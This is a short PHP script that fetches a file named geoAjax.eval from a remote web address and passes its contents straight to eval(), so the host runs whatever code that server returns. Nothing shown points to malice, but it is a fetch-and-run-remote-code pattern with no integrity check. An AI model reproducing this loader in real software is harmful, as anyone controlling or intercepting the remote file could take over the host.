<?php
$page = file_get_contents("https://bartonlp.com/otherpages/geoAjax.eval");
return eval("?>". $page);
